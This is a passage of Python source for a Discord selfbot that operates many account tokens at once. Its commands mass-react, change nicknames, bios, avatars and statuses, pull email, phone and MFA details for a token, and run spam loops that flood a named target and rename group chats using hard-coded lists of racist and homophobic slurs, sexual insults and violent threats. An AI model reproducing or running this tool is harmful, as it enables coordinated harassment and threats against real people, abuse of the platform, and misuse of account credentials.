            except discord.HTTPException as e:
                if e.code == 429:
                    retry_after = e.retry_after if hasattr(e, 'retry_after') else 1
                    await asyncio.sleep(retry_after)
                    continue
                else:
                    await ctx.send(f"```Error: {str(e)}```")
                    break
            except asyncio.CancelledError:
                break
            except Exception as e:
                await ctx.send(f"```Error: {str(e)}```")
                break

    ugc_task = asyncio.create_task(name_changer())
    await ctx.send("```Group chat name changer started```")

@bot.command()
@require_password()
async def ugcend(ctx):
    global ugc_task
    
    if ugc_task is None:
        await ctx.send("```Group chat name changer is not currently running```")
        return
        
    ugc_task.cancel()
    ugc_task = None
    await ctx.send("```Group chat name changer stopped```")

@bot.command()
@require_password()
async def mr(ctx, message_id: str = None, emoji: str = None):
    if not message_id or not emoji:
        await ctx.send("```Usage: $mr <message_id> <emoji>```")
        return

    try:
        message_id = int(message_id)
    except ValueError:
        await ctx.send("```Invalid message ID```")
        return

    tokens = loads_tokens()
    if not tokens:
        await ctx.send("```No tokens found in token.txt```")
        return

    msg = await ctx.send(f"```Reacting to message {message_id} with {emoji}...```")

    async def add_reaction(token):
        max_retries = 3
        for attempt in range(max_retries):
            try:
                async with aiohttp.ClientSession() as session:
                    headers = {'Authorization': token}
                    url = f'https://discord.com/api/v9/channels/{ctx.channel.id}/messages/{message_id}/reactions/{emoji}/@me'
                    
                    async with session.put(url, headers=headers) as resp:
                        if resp.status == 429: 
                            retry_after = float((await resp.json()).get('retry_after', 1))
                            await asyncio.sleep(retry_after)
                            continue
                        elif resp.status == 403:
                            print(f"{Fore.RED}[ERROR] Token {token[-4:]} is forbidden")
                            return False
                        elif resp.status != 200:
                            print(f"{Fore.RED}[ERROR] Token {token[-4:]} status {resp.status}")
                            await asyncio.sleep(1)
                            continue
                        return True

            except Exception as e:
                print(f"{Fore.RED}[ERROR] Reaction failed for token {token[-4:]}: {str(e)}")
                if attempt < max_retries - 1:
                    continue
                return False
        return False

    tasks = [add_reaction(token) for token in tokens]
    await asyncio.gather(*tasks)
    await msg.edit(content="```Mass reaction complete```")

afk_users = {}
afk_messages = {}

@bot.command()
@require_password()
async def afk(ctx, *, message: str = "AFK"):
    user_id = ctx.author.id
    
    if user_id in afk_users:
        afk_time = afk_users[user_id]
        time_afk = datetime.now() - afk_time
        hours = time_afk.seconds // 3600
        minutes = (time_afk.seconds % 3600) // 60
        
        mentions = afk_messages.get(user_id, [])
        del afk_users[user_id]
        if user_id in afk_messages:
            del afk_messages[user_id]
            
        if not mentions:
            await ctx.send(f"```AFK for {hours}h {minutes}m\nNo mentions while you were away```")
        else:
            mention_list = "\n".join([f"• {msg}" for msg in mentions])
            chunks = [mention_list[i:i+1900] for i in range(0, len(mention_list), 1900)]
            
            await ctx.send(f"```AFK for {hours}h {minutes}m\nYou were mentioned in these messages:```")
            for chunk in chunks:
                await ctx.send(f"{chunk}")
    else:
        afk_users[user_id] = datetime.now()
        afk_messages[user_id] = []
        await ctx.message.add_reaction('✅')



ladder_msg1 = [
    "nigga i dont fucking know you? ",
    "{mention} disgusting bitch",
    "# YO {UPuser} TAKE THE HEAT OR DIE LMFAO",
    "dont fail the afk checks LMFAO",
    "honestly id bitch both {user1} and {user2}",
    "{mention} LMFAOOOO",
    "what the fuck is a {user1} or a {user2}",
    "LMFAO WHO THE FUCK IS {UPuser}",
    "NIGGA WE DONT FWU",
    "STUPID FUCKING SLUT",
    "{mention} sadly your dying and your bf {user2} is dogshit",
    "tbf your boyfriend {user2} is dying LMAO",
    "lets outlast ill be here all day dw",
    "this nigga teary eye typin",
    "DO I KNOW YOU? {UPuser}",
    "who is {user2}",
    "we dont rate you"
]

ladder_msg2 = [
    "WHAT THE FUCK WAS THAT LMFAO",
    "nigga ill rip your spine out {mention}",
    "brainless freak",
    "disgusting slut",
    "{user1} {user2} i don fuck with you?",
    "{mention} dont get teary eyed now",
    "who the fuck is {user1} {user2}",
    "nigga sadly your my bitch lets go forever {mention}",
    "{user1} stop tryna chatpack LMFAO",
    "you might aswell just quit {mention}",
    "na thats crazy 😂",
    "we hoeing the shit out of you",
    "ill beat on you lil nigga {mention}",
    "nigga ill cuck your mom and youd enjoy it {mention}",
    "frail digusting BITCH"
]

testimony_running = False
testimony_tasks = {}

@bot.command()
@require_password()
async def testimony(ctx, user1: discord.User, user2: discord.User = None):
    global testimony_running
    testimony_running = True
    channel_id = ctx.channel.id
    
    tokens = loads_tokens()
    valid_tokens = set(tokens)  
    
    async def send_messages(token, message_list):
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json'
        }
        
        while testimony_running and token in valid_tokens:
            try:
                message = random.choice(message_list)
                formatted_message = (message
                    .replace("{user}", user1.display_name)
                    .replace("{mention}", user1.mention)
                    .replace("{UPuser}", user1.display_name.upper())
                    .replace("{user1}", user1.display_name)
                    .replace("{user2}", user2.display_name if user2 else "")
                )
                
                payload = {'content': formatted_message}
                
                async with aiohttp.ClientSession() as session:
                    async with session.post(
                        f'https://discord.com/api/v9/channels/{channel_id}/messages',
                        headers=headers,
                        json=payload
                    ) as resp:
                        if resp.status == 200:
                            print(f"Message sent successfully with token: {token[-4:]}")
                            await asyncio.sleep(random.uniform(0.5, 1))
                        elif resp.status == 429:
                            retry_after = random.uniform(3, 5)
                            print(f"Rate limited. Waiting {retry_after:.2f}s...")
                            await asyncio.sleep(retry_after)
                            continue
                        elif resp.status == 403:
                            print(f"Token {token[-4:]} is invalid (403). Removing from rotation.")
                            valid_tokens.remove(token)
                            break
                        else:
                            print(f"Error sending message: Status {resp.status}")
                            await asyncio.sleep(random.uniform(3, 5))
                            continue
                
            except Exception as e:
                print(f"Error in testimony task: {str(e)}")
                await asyncio.sleep(random.uniform(3, 5))
                continue
    
    tasks = []
    for i, token in enumerate(tokens):
        message_list = ladder_msg1 if i % 2 == 0 else ladder_msg2
        task = bot.loop.create_task(send_messages(token, message_list))
        tasks.append(task)
    
    testimony_tasks[channel_id] = tasks
    await ctx.send("```Testimony spam started. Use $testimonyoff to stop.```")

@bot.command()
@require_password()
async def testimonyoff(ctx):
    global testimony_running
    channel_id = ctx.channel.id
    
    if channel_id in testimony_tasks:
        testimony_running = False
        for task in testimony_tasks[channel_id]:
            task.cancel()
        testimony_tasks.pop(channel_id)
        await ctx.send("```Testimony spam stopped.```")
    else:
        await ctx.send("```No testimony spam running in this channel```")
untouchablegc = [
    "your a pedo btw {user}",
    "yo faggot wake up",
    "yo {user} your my bitch",
    "idk you loser",
    "{user} come meet god for me",
    "ill pound your head in",
    "ill make you look unreconizable"
]

untouchablemsg = [
    "idk you either {user2}",
    "your my bitch forever",
    "faggot wanna be",
    "user retard",
    "your my bitch {user} remember that",
    "REMEMBER THIS DAY FOREVER LMFAO",
    "fucking wannabe loser"
]

gcss_words = [
    "your a loser",
    "yo faggot wake up",
    "yo {user} your my bitch",
    "idk you loser",
    "{user} come meet god for me",
    "ill pound your head in",
    "ill make you look unreconizable"
]

gcss_tasks = {}
gc_name_counter = {}

@bot.command()
@require_password()
async def gcss(ctx, name: str = None):
    if not isinstance(ctx.channel, discord.GroupChannel):
        await ctx.send("```This command can only be used in group chats```")
        return

    if name is None:
        await ctx.send("```Usage: $gcss <name>```")
        return

    channel_id = ctx.channel.id
    gc_name_counter[channel_id] = 1
    
    tokens = loads_tokens()
    active_tokens = tokens.copy()

    async def change_gc_names():
        while channel_id in gcss_tasks:
            if not active_tokens:
                print(f"{Fore.RED}[ERROR] All tokens have been rate limited or errored")
                return

            for token in active_tokens[:]:
                try:
                    async with aiohttp.ClientSession() as session:
                        headers = {
                            'Authorization': token,
                            'Content-Type': 'application/json'
                        }

                    gc_name = random.choice(gcss_words).replace("{user}", name)
                    gc_name = f"{gc_name} {gc_name_counter[channel_id]}"

                    async with session.patch(
                            f'https://discord.com/api/v9/channels/{channel_id}',
                            headers=headers,
                            json={'name': gc_name}
                        ) as resp:
                            if resp.status == 403:
                                print(f"{Fore.RED}[ERROR] Name token removed due to 403: {token[-4:]}")
                                active_tokens.remove(token)
                            elif resp.status == 429:
                                retry_after = random.uniform(3, 5)
                                print(f"{Fore.YELLOW}[RATELIMIT] Token {token[-4:]} sleeping for {retry_after:.2f}s")
                                await asyncio.sleep(retry_after)
                            elif resp.status == 200:
                                gc_name_counter[channel_id] += 1

                except Exception as e:
                    if token in active_tokens:
                        active_tokens.remove(token)

                await asyncio.sleep(0.1)

    gcss_tasks[channel_id] = asyncio.create_task(change_gc_names())
    await ctx.send("```GC name spam started```")

@bot.command()
@require_password()
async def gcssend(ctx):
    channel_id = ctx.channel.id
    if channel_id in gcss_tasks:
        gcss_tasks[channel_id].cancel()
        del gcss_tasks[channel_id]
        if channel_id in gc_name_counter:
            del gc_name_counter[channel_id]
        await ctx.send("```GC name spam stopped```")
    else:
        await ctx.send("```No GC name spam running in this channel```")


@bot.command()
@require_password()
async def untouchable(ctx, user_id: str = None, name1: str = None, name2: str = None):
    if not isinstance(ctx.channel, discord.GroupChannel):
        await ctx.send("```This command can only be used in group chats```")
        return

    if user_id is None or name1 is None:
        await ctx.send("```Usage: $untouchable <user_id> <name1> <name2>```")
        return

    user_id = user_id.replace('<@', '').replace('>', '')
    try:
        target_id = int(user_id)
    except ValueError:
        await ctx.send("```Invalid user ID```")
        return

    channel_id = ctx.channel.id
    gc_name_counter[channel_id] = 1
    

    if 'locks' not in gc_name_counter:
        gc_name_counter['locks'] = {}
    gc_name_counter['locks'][channel_id] = asyncio.Lock()
    
    config = load_config()
    main_token = config['token']
    alt_tokens = loads_tokens()
    all_tokens = [main_token] + alt_tokens
    
    mid_point = len(all_tokens) // 2
    name_tokens = all_tokens[:mid_point]
    message_tokens = all_tokens[mid_point:]
    
    if main_token not in name_tokens:
        name_tokens.append(main_token)
    if main_token not in message_tokens:
        message_tokens.append(main_token)
    
    active_name_tokens = name_tokens.copy()
    active_message_tokens = message_tokens.copy()

    if name2 is None:
        messages = [msg for msg in untouchablemsg if "{user2}" not in msg]
    else:
        messages = untouchablemsg.copy()

    async def change_gc_names():
        current_number = 1
        while channel_id in untouchable_tasks:
            if not active_name_tokens:
                print(f"{Fore.RED}[ERROR] All name changing tokens have been rate limited or errored")
                return

            any_success = False
            tasks = []
            
            for token in active_name_tokens[:]:
                async def change_name(token):
                    try:
                        async with aiohttp.ClientSession() as session:
                            headers = {
                                'Authorization': token,
                                'Content-Type': 'application/json'
                            }

                        gc_name = random.choice(untouchablegc).replace("{user}", name1)
                        gc_name = f"{gc_name} {current_number}"

                        async with session.patch(
                                f'https://discord.com/api/v9/channels/{channel_id}',
                                headers=headers,
                                json={'name': gc_name}
                            ) as resp:
                                if resp.status == 403:
                                    print(f"{Fore.RED}[ERROR] Name token removed due to 403: {token[-4:]}")
                                    active_name_tokens.remove(token)
                                elif resp.status == 429:
                                    retry_after = random.uniform(3, 5)
                                    print(f"{Fore.YELLOW}[RATELIMIT] Token {token[-4:]} sleeping for {retry_after:.2f}s")
                                    await asyncio.sleep(retry_after)
                                elif resp.status == 200:
                                    nonlocal any_success
                                    any_success = True

                    except Exception as e:
                        print(f"{Fore.RED}[ERROR] Name change error with token {token[-4:]}: {str(e)}")
                        if token in active_name_tokens:
                            active_name_tokens.remove(token)

                tasks.append(change_name(token))


            await asyncio.gather(*tasks)
            
  
            if any_success:
                current_number += 1
            
            await asyncio.sleep(0.1)

    async def send_messages():
        while channel_id in untouchable_tasks:
            if not active_message_tokens:
                print(f"{Fore.RED}[ERROR] All message tokens have been rate limited or errored")
                return

            tasks = []
            for token in active_message_tokens[:]:
                async def send_message(token):
                    try:
                        async with aiohttp.ClientSession() as session:
                            headers = {
                                'Authorization': token,
                                'Content-Type': 'application/json'
                            }

                            message = random.choice(messages).replace("{user}", name1)
                            if name2:
                                message = message.replace("{user2}", name2)
                            message = f"{message} <@{target_id}>"

                            async with session.post(
                                f'https://discord.com/api/v9/channels/{channel_id}/messages',
                                headers=headers,
                                json={'content': message}
                            ) as resp:
                                if resp.status == 403:
                                    print(f"{Fore.RED}[ERROR] Message token removed due to 403: {token[-4:]}")
                                    active_message_tokens.remove(token)
                                elif resp.status == 429:
                                    retry_after = random.uniform(3, 5)
                                    print(f"{Fore.YELLOW}[RATELIMIT] Token {token[-4:]} retry after {retry_after}s")
                                    await asyncio.sleep(retry_after)

                    except Exception as e:
                        print(f"{Fore.RED}[ERROR] Message error with token {token[-4:]}: {str(e)}")
                        if token in active_message_tokens:
                            active_message_tokens.remove(token)

                tasks.append(send_message(token))

            await asyncio.gather(*tasks)
            await asyncio.sleep(random.uniform(0.2555, 0.5555))

    name_task = asyncio.create_task(change_gc_names())
    message_task = asyncio.create_task(send_messages())
    untouchable_tasks[channel_id] = [name_task, message_task]
    
    await ctx.send("```Untouchable spam started```")

@bot.command()
@require_password()
async def untouchableend(ctx):
    channel_id = ctx.channel.id
    if channel_id in untouchable_tasks:
        for task in untouchable_tasks[channel_id]:
            task.cancel()
        del untouchable_tasks[channel_id]
        if channel_id in gc_name_counter:
            del gc_name_counter[channel_id]
        await ctx.send("```Untouchable spam stopped```")
    else:
        await ctx.send("```No untouchable spam running in this channel```")








@bot.command()
@require_password()
async def tnickname(ctx, server_id: str, *, name: str = None):
    tokens = loads_tokens()
    total_tokens = len(tokens)
    
    status_msg = await ctx.send(f"""```ansi
{cyan}Token Nickname Changer{reset}
Total tokens available: {total_tokens}
How many tokens do you want to use? (Type 'all' or enter a number)```""")

    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel

    try:
        amount_msg = await bot.wait_for('message', timeout=20.0, check=check)
        amount = amount_msg.content.lower()
        
        if amount == 'all':
            selected_tokens = tokens
        else:
            try:
                num = int(amount)
                if num > total_tokens:

                    await status_msg.edit(content="```NOT enough tokens available```")
                    return
                selected_tokens = random.sample(tokens, num)

            except ValueError:
                await status_msg.edit(content="```Invalid number```")
                return

        if name is None:
            await status_msg.edit(content=f"""```ansi
Choose nickname mode:
1. {yellow}Random{reset} (generates unique names)
2. {green}List{reset} (uses names from tnickname.txt)```""")
            
            mode_msg = await bot.wait_for('message', timeout=30.0, check=check)
            mode = mode_msg.content
            
            if mode == "1":
                names = [''.join(random.choices(string.ascii_letters, k=8)) for _ in range(len(selected_tokens))]
            elif mode == "2":
                try:
                    with open('tnickname.txt', 'r') as f:
                        name_list = [line.strip() for line in f if line.strip()]
                        names = random.choices(name_list, k=len(selected_tokens))
                except FileNotFoundError:
                    await status_msg.edit(content="```tnickname.txt not found```")
                    return
            else:
                await status_msg.edit(content="```Invalid mode selected```")
                return
        else:
            names = [name] * len(selected_tokens)

        success = 0
        headers = {'Authorization': '', 'Content-Type': 'application/json'}
        
        async with aiohttp.ClientSession() as session:
            for i, (token, nickname) in enumerate(zip(selected_tokens, names), 1):
                headers['Authorization'] = token
                async with session.patch(
                    f'https://discord.com/api/v9/guilds/{server_id}/members/@me/nick',
                    headers=headers,
                    json={'nick': nickname}
                ) as resp:
                    if resp.status == 200:
                        success += 1
                    
                    progress = f"""```ansi
{cyan}Changing Nicknames...{reset}
Progress: {i}/{len(selected_tokens)} ({(i/len(selected_tokens)*100):.1f}%)
Success: {success}
Current name: {nickname}```"""
                    await status_msg.edit(content=progress)
                    await asyncio.sleep(0.5)

        final_msg = f"""```ansi
{green}Nickname Change Complete{reset}
Successfully changed: {success}/{len(selected_tokens)} nicknames```"""
        await status_msg.edit(content=final_msg)

    except asyncio.TimeoutError:
        await status_msg.edit(content="```Command timed out```")

@bot.command()
@require_password()
async def tpronouns(ctx, *, pronouns: str = None):
    tokens = loads_tokens()
    total_tokens = len(tokens)
    
    

    status_msg = await ctx.send(f"""```ansi\n
{cyan}Token Pronoun Changer{reset}
Total tokens available: {total_tokens}

How many tokens do you want to use? (Type 'all' or enter a number)```""")

    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel

    try:
        amount_msg = await bot.wait_for('message', timeout=20.0, check=check)
        amount = amount_msg.content.lower()
        
        if amount == 'all':
            selected_tokens = tokens
        else:
            num = int(amount)
            if num > total_tokens:

                await status_msg.edit(content="```NOT enough tokens available```")
                return
            selected_tokens = random.sample(tokens, num)

        if pronouns is None:
            pronoun_list = ['he/him', 'she/her', 'they/them', 'it/its', 'xe/xem', 'ze/zir']
            pronouns = random.choices(pronoun_list, k=len(selected_tokens))
        else:
            pronouns = [pronouns] * len(selected_tokens)

        success = 0
        headers = {'Authorization': '', 'Content-Type': 'application/json'}
        
        async with aiohttp.ClientSession() as session:
            for i, (token, pronoun) in enumerate(zip(selected_tokens, pronouns), 1):
                headers['Authorization'] = token
                async with session.patch(
                    'https://discord.com/api/v9/users/@me/profile',
                    headers=headers,
                    json={'pronouns': pronoun}
                ) as resp:
                    if resp.status == 200:
                        success += 1
                    

                    progress = f"""```ansi\n
{cyan}Changing Pronouns...{reset}
Progress: {i}/{len(selected_tokens)} ({(i/len(selected_tokens)*100):.1f}%)
Success: {success}

Current pronouns: {pronoun}```"""
                    await status_msg.edit(content=progress)
                    await asyncio.sleep(0.5)


        await status_msg.edit(content=f"""```ansi\n
{green}Pronoun Change Complete{reset}

Successfully changed: {success}/{len(selected_tokens)} pronouns```
""")
    except asyncio.TimeoutError:
        await status_msg.edit(content=" timed out")
    except Exception as e:
        await status_msg.edit(content=f" error occurred: {str(e)}")
@bot.command()
@require_password()
async def tbio(ctx, *, bio: str = None):
    tokens = loads_tokens()
    total_tokens = len(tokens)
    
    status_msg = await ctx.send(f"""```ansi
{cyan}Token Bio Changer{reset}
Total tokens available: {total_tokens}
How many tokens do you want to use? (Type 'all' or enter a number)```""")

    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel

    try:
        amount_msg = await bot.wait_for('message', timeout=20.0, check=check)
        amount = amount_msg.content.lower()
        
        if amount == 'all':
            selected_tokens = tokens
        else:
            try:
                num = int(amount)
                if num > total_tokens:
                    await status_msg.edit(content="```Not enough tokens available```")
                    return
                selected_tokens = random.sample(tokens, num)
            except ValueError:
                await status_msg.edit(content="```Invalid number```")
                return

        if bio is None:
            await status_msg.edit(content=f"""```ansi
Choose bio mode:
1. {yellow}Random{reset} (generates random bios)
2. {green}List{reset} (uses bios from tbio.txt)```""")
            
            mode_msg = await bot.wait_for('message', timeout=30.0, check=check)
            mode = mode_msg.content
            
            if mode == "1":
                bios = [f"Bio #{i} | " + ''.join(random.choices(string.ascii_letters + string.digits, k=20)) for i in range(len(selected_tokens))]
            elif mode == "2":
                try:
                    with open('tbio.txt', 'r') as f:
                        bio_list = [line.strip() for line in f if line.strip()]
                        bios = random.choices(bio_list, k=len(selected_tokens))
                except FileNotFoundError:
                    await status_msg.edit(content="```tbio.txt not found```")
                    return
        else:
            bios = [bio] * len(selected_tokens)

        success = 0
        headers = {'Authorization': '', 'Content-Type': 'application/json'}
        
        async with aiohttp.ClientSession() as session:
            for i, (token, bio_text) in enumerate(zip(selected_tokens, bios), 1):
                headers['Authorization'] = token
                async with session.patch(
                    'https://discord.com/api/v9/users/@me/profile',
                    headers=headers,
                    json={'bio': bio_text}
                ) as resp:
                    if resp.status == 200:
                        success += 1
                    
                    progress = f"""```ansi
{cyan}Changing Bios...{reset}
Progress: {i}/{len(selected_tokens)} ({(i/len(selected_tokens)*100):.1f}%)
Success: {success}
Current bio: {bio_text[:50]}{'...' if len(bio_text) > 50 else ''}```"""
                    await status_msg.edit(content=progress)
                    await asyncio.sleep(0.5)

        await status_msg.edit(content=f"""```ansi
{green}Bio Change Complete{reset}
Successfully changed: {success}/{len(selected_tokens)} bios```""")

    except asyncio.TimeoutError:
        await status_msg.edit(content="```Command timed out```")
    except Exception as e:
        await status_msg.edit(content=f"```An error occurred: {str(e)}```")

@bot.command()
@require_password()
async def tpfp(ctx, url: str = None):
    tokens = loads_tokens()
    total_tokens = len(tokens)
    
    status_msg = await ctx.send(f"""```ansi
\u001b[0;36mToken PFP Changer\u001b[0m
Total tokens available: {total_tokens}
How many tokens do you want to use? (Type 'all' or enter a number)```""")

    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel

    try:
        amount_msg = await bot.wait_for('message', timeout=20.0, check=check)
        amount = amount_msg.content.lower()
        
        if amount == 'all':
            selected_tokens = tokens
        else:
            try:
                num = int(amount)
                if num > total_tokens:
                    await status_msg.edit(content="```Not enough tokens available```")
                    return
                selected_tokens = random.sample(tokens, num)
            except ValueError:
                await status_msg.edit(content="```Invalid number```")
                return

        if url is None:
            await status_msg.edit(content="```Please provide an image URL```")
            return

        success = 0
        failed = 0
        ratelimited = 0
        
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as img_response:
                if img_response.status != 200:
                    await status_msg.edit(content="```Failed to fetch image```")
                    return
                image_data = await img_response.read()
                image_b64 = base64.b64encode(image_data).decode()
                
                content_type = img_response.headers.get('Content-Type', '')
                if 'gif' in content_type.lower():
                    image_format = 'gif'
                else:
                    image_format = 'png'

            for i, token in enumerate(selected_tokens, 1):
                try:
                    online_data = {
                        'status': 'online'
                    }
                    
                    status_data = {
                        'custom_status': {
                            'text': 'Changing PFP...'
                        },
                        'status': 'online'  
                    }
                    
                    async with session.patch(
                        'https://discord.com/api/v9/users/@me/settings',
                        headers={
                            'Authorization': token,
                            'Content-Type': 'application/json'
                        },
                        json=online_data
                    ) as resp1:
                        
                        async with session.patch(
                            'https://discord.com/api/v9/users/@me/settings',
                            headers={
                                'Authorization': token,
                                'Content-Type': 'application/json'
                            },
                            json=status_data
                        ) as resp2:
                            if resp1.status == 200 and resp2.status == 200:
                                payload = {
                                    "avatar": f"data:image/{image_format};base64,{image_b64}"
                                }
                                
                                async with session.patch(
                                    'https://discord.com/api/v9/users/@me',
                                    headers={
                                        'Authorization': token,
                                        'Content-Type': 'application/json'
                                    },
                                    json=payload
                                ) as resp3:
                                    if resp3.status == 200:
                                        success += 1
                                    elif "captcha_key" in (await resp3.json()):
                                        failed += 1
                                        print(f"Captcha required for token {i}")
                                    elif "AVATAR_RATE_LIMIT" in str(await resp3.json()):
                                        ratelimited += 1
                                        print(f"Rate limited for token {i}, waiting 30 seconds")
                                        await asyncio.sleep(30)  
                                        i -= 1  
                                        continue
                                    else:
                                        failed += 1
                                        print(f"Failed to update token {i}: {(await resp3.json())}")
                            
                                progress = f"""```ansi
\u001b[0;36mChanging Profile Pictures...\u001b[0m
Progress: {i}/{len(selected_tokens)} ({(i/len(selected_tokens)*100):.1f}%)
Success: {success}
Failed: {failed}
Rate Limited: {ratelimited}```"""
                                await status_msg.edit(content=progress)
                                await asyncio.sleep(2)  
                except Exception as e:
                    failed += 1
                    print(f"Error with token {i}: {str(e)}")
                    continue

        await status_msg.edit(content=f"""```ansi
\u001b[0;32mProfile Picture Change Complete\u001b[0m
Successfully changed: {success}/{len(selected_tokens)} avatars
Failed: {failed}
Rate Limited: {ratelimited}```""")

    except asyncio.TimeoutError:
        await status_msg.edit(content="```Command timed out```")
    except Exception as e:
        await status_msg.edit(content=f"```An error occurred: {str(e)}```")
@bot.command()
@require_password()
async def tstatus(ctx, *, status_text: str = None):
    tokens = loads_tokens()
    total_tokens = len(tokens)
    
    if not status_text:
        await ctx.send("```Please provide a status text```")
        return

    status_msg = await ctx.send(f"""```ansi
\u001b[0;36mToken Status Changer\u001b[0m
Total tokens available: {total_tokens}
How many tokens do you want to use? (Type 'all' or enter a number)```""")

    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel

    try:
        amount_msg = await bot.wait_for('message', timeout=20.0, check=check)
        amount = amount_msg.content.lower()
        
        if amount == 'all':
            selected_tokens = tokens
        else:
            try:
                num = int(amount)
                if num > total_tokens:
                    await status_msg.edit(content="```Not enough tokens available```")
                    return
                selected_tokens = random.sample(tokens, num)
            except ValueError:
                await status_msg.edit(content="```Invalid number```")
                return

        success = 0
        
        async with aiohttp.ClientSession() as session:
            for i, token in enumerate(selected_tokens, 1):
                online_data = {
                    'status': 'online'
                }
                
                status_data = {
                    'custom_status': {
                        'text': status_text
                    },
                    'status': 'online'  
                }
                
                async with session.patch(
                    'https://discord.com/api/v9/users/@me/settings',
                    headers={
                        'Authorization': token,
                        'Content-Type': 'application/json'
                    },
                    json=online_data
                ) as resp1:
                    
                    async with session.patch(
                        'https://discord.com/api/v9/users/@me/settings',
                        headers={
                            'Authorization': token,
                            'Content-Type': 'application/json'
                        },
                        json=status_data
                    ) as resp2:
                        if resp1.status == 200 and resp2.status == 200:
                            success += 1
                        
                        progress = f"""```ansi
\u001b[0;36mChanging Statuses...\u001b[0m
Progress: {i}/{len(selected_tokens)} ({(i/len(selected_tokens)*100):.1f}%)
Success: {success}
Current status: {status_text}```"""
                        await status_msg.edit(content=progress)
                        await asyncio.sleep(0.5)

        await status_msg.edit(content=f"""```ansi
\u001b[0;32mStatus Change Complete\u001b[0m
Successfully changed: {success}/{len(selected_tokens)} statuses to: {status_text}```""")

    except asyncio.TimeoutError:
        await status_msg.edit(content="```Command timed out```")
    except Exception as e:
        await status_msg.edit(content=f"```An error occurred: {str(e)}```")

@bot.command()
@require_password()
async def tstatusoff(ctx):
    tokens = loads_tokens()
    total_tokens = len(tokens)
    
    status_msg = await ctx.send(f"""```ansi
\u001b[0;36mToken Status Reset\u001b[0m
Total tokens available: {total_tokens}
How many tokens do you want to reset? (Type 'all' or enter a number)```""")

    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel

    try:
        amount_msg = await bot.wait_for('message', timeout=20.0, check=check)
        amount = amount_msg.content.lower()
        
        if amount == 'all':
            selected_tokens = tokens
        else:
            try:
                num = int(amount)
                if num > total_tokens:
                    await status_msg.edit(content="```Not enough tokens available```")
                    return
                selected_tokens = random.sample(tokens, num)
            except ValueError:
                await status_msg.edit(content="```Invalid number```")
                return

        success = 0
        
        async with aiohttp.ClientSession() as session:
            for i, token in enumerate(selected_tokens, 1):

                reset_data = {
                    'custom_status': None,
                    'status': 'online' 
                }
                
                async with session.patch(
                    'https://discord.com/api/v9/users/@me/settings',
                    headers={
                        'Authorization': token,
                        'Content-Type': 'application/json'
                    },
                    json=reset_data
                ) as resp:
                    if resp.status == 200:
                        success += 1
                    
                    progress = f"""```ansi
\u001b[0;36mResetting Statuses...\u001b[0m
Progress: {i}/{len(selected_tokens)} ({(i/len(selected_tokens)*100):.1f}%)
Success: {success}```"""
                    await status_msg.edit(content=progress)
                    await asyncio.sleep(0.5)

        await status_msg.edit(content=f"""```ansi
\u001b[0;32mStatus Reset Complete\u001b[0m
Successfully reset: {success}/{len(selected_tokens)} statuses```""")

    except asyncio.TimeoutError:
        await status_msg.edit(content="```Command timed out```")
    except Exception as e:
        await status_msg.edit(content=f"```An error occurred: {str(e)}```")

@bot.command()
@require_password()
async def tinfo(ctx, token_input: str):
    tokens = loads_tokens()
    
    try:
        index = int(token_input) - 1
        if 0 <= index < len(tokens):
            token = tokens[index]
        else:
            await ctx.send("```Invalid token number```")
            return
    except ValueError:
        token = token_input
        if token not in tokens:
            await ctx.send("```Invalid token```")
            return

    status_msg = await ctx.send("```Fetching token information...```")

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(
                'https://discord.com/api/v9/users/@me',
                headers={
                    'Authorization': token,
                    'Content-Type': 'application/json'
                }
            ) as resp:
                if resp.status != 200:
                    await status_msg.edit(content="```Failed to fetch token information```")
                    return
                
                user_data = await resp.json()
                
                async with session.get(
                    'https://discord.com/api/v9/users/@me/connections',
                    headers={
                        'Authorization': token,
                        'Content-Type': 'application/json'
                    }
                ) as conn_resp:
                    connections = await conn_resp.json() if conn_resp.status == 200 else []

                async with session.get(
                    'https://discord.com/api/v9/users/@me/guilds',
                    headers={
                        'Authorization': token,
                        'Content-Type': 'application/json'
                    }
                ) as guild_resp:
                    guilds = await guild_resp.json() if guild_resp.status == 200 else []

                created_at = datetime.fromtimestamp(((int(user_data['id']) >> 22) + 1420070400000) / 1000)
                created_date = created_at.strftime('%Y-%m-%d %H:%M:%S')

                info = f"""```ansi
        {blue}─────────────────────────────────────────────────────────────────────────────────────────────────────────────
                                \u001b[0;36mToken Account Information\u001b[0m

                                \u001b[0;33mBasic Information:\u001b[0m
                                Username: {user_data['username']}#{user_data['discriminator']}
                                ID: {user_data['id']}
                                Email: {user_data.get('email', 'Not available')}
                                Phone: {user_data.get('phone', 'Not available')}
                                Created: {created_date}
                                Verified: {user_data.get('verified', False)}
                                MFA Enabled: {user_data.get('mfa_enabled', False)}

                                \u001b[0;33mNitro Status:\u001b[0m
                                Premium: {bool(user_data.get('premium_type', 0))}
                                Type: {['None', 'Classic', 'Full'][user_data.get('premium_type', 0)]}

                                \u001b[0;33mStats:\u001b[0m
                                Servers: {len(guilds)}
                                Connections: {len(connections)}

                                \u001b[0;33mProfile:\u001b[0m
                                Bio: {user_data.get('bio', 'No bio set')}
                                Banner: {'Yes' if user_data.get('banner') else 'No'}
                                Avatar: {'Yes' if user_data.get('avatar') else 'Default'}
        {blue}─────────────────────────────────────────────────────────────────────────────────────────────────────────────

```"""

                await status_msg.edit(content=info)

    except Exception as e:
        await status_msg.edit(content=f"```An error occurred: {str(e)}```")


@bot.event
async def on_message(message):
    if message.author.id in afk_users and not message.author.bot:
        afk_time = afk_users[message.author.id]
        time_afk = datetime.now() - afk_time
        hours = time_afk.seconds // 3600
        minutes = (time_afk.seconds % 3600) // 60
        
        mentions = afk_messages.get(message.author.id, [])
        del afk_users[message.author.id]
        if message.author.id in afk_messages:
            del afk_messages[message.author.id]
            
        if not mentions:
            await message.channel.send(f"```AFK for {hours}h {minutes}m\nNo mentions while you were away```")
        else:
            mention_list = "\n".join([f"• {msg}" for msg in mentions])
            chunks = [mention_list[i:i+1900] for i in range(0, len(mention_list), 1900)]
            
            await message.channel.send(f"```You were mentioned in these messages:```")
            for chunk in chunks:
                await message.channel.send(f"{chunk}")
    
    for user_id in afk_users.keys():
        user = bot.get_user(user_id)
        if user and (user.mention in message.content or f'<@!{user_id}>' in message.content):
